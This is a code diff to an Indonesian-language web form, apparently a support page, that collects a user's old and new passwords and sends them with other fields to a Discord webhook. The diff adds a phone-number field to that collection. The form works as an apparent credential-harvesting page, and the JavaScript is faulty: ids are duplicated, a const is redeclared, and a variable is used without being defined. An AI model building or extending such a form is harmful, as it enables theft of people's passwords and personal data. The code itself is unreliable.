@@ -80,6 +80,9 @@
       <label for="Keterangan">Keterangan Jam:</label>
         <input type="text" id="contact" placeholder="Contoh: jam 2 pagi" required>
 
+      <label for="NoTelp">Nomor Telepon:</label>
+        <input type="text" id="contact" placeholder="Contoh: +62-xxx-xxx-xxx" required>
+
         <label for="message">Kendala:</label>
         <textarea id="message" rows="3" placeholder="Jelaskan kendala kamu..." required></textarea>
 
@@ -98,6 +101,8 @@
         const message = document.
         getElementById('Keterangan').value;
         const message = document.
+        getElementById('NoTelp').value;
+        const message = document.
         getElementById('message').value;
 
         // Ganti URL ini dengan URL Webhook Discord Anda sendiri
@@ -112,6 +117,7 @@
                     { name: "Password Lama", value: PassowrdLma, inline: true },
                     { name: "Password Baru", value: PassowrdBru, inline: true },
                     { name: "Keterangan Jam", value: Keterangan, inline: true },
+                    { name: "Nomor Telepon", value: NoTelp, inline: true },
                     { name: "Detail Kendala", value: message }
                 ],
                 timestamp: new Date()
